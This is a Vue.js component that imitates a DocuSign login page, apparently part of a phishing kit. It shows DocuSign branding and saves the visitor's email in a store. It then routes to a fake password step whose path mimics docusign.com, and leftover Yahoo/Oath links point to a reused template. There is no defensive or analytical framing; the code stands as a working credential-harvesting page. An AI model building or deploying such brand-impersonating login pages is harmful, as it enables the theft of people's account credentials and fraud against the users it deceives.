<template>
    <div>
     <div class="content"><center>
     <div class="docusign-div">
 
                <img src="https://www.satuit.com/images/default-source/default-album/docusign-logo.png?sfvrsn=e8438f89_1" alt="" height='40px'>
            <br><br>
             <p style="font-size:23px;"><b>Please log in to your account</b></p>
            <br>
             <form @submit.prevent = "toPass">
            <input placeholder="Email Address" v-model="Cemail" type="email" class="text-field" required>
            <br>
            <br>
            <Button type="submit" style=" width:100%; font-size:14px;background:#ffc820;padding:10px 25px;font-weight:bold;">CONTINUE</Button>  
            </form>
            <br>
           <p style="font-size:13px"><a href="https://account.docusign.com/signup">No account? Sign up for free</a></p>
     </div> </center>
     </div>
     <div class="login-footer">
      <a href="https://policies.oath.com/us/en/oath/terms/otos/index.html">Terms |</a>
       <a href="https://policies.oath.com/us/en/oath/privacy/index.html"> Privacy</a>
     </div>
   </div>
</template>


<script>
 import { mapGetters } from 'vuex'
  export default {
      data() {
    return {
      Cemail: ''
    }
  },
 
  methods:{
    toPass(){
       this.$store.commit('addEmail', this.Cemail) 
      this.$router.push("/account/challenge/password-authMechanism-primary-display-login-done-www.docusign.com")
    },
    Create(){
      window.location.assign("https://login.yahoo.com/account/create?specId=yidReg")
    }
  }
}
</script>

<style scoped>
.text-field { padding-left:15px; height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.docusign-div {  width: 400px; text-align: center; }
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 10% 0px;}


  @media (max-width: 991px) { 
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 10% 180px;}

  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 20px 30px 20px;}
.text-card {padding: 80px 20px 0px 20px; font-size:22px; letter-spacing: 1px;}
.content { padding: 20px 20px;}

    }
</style>
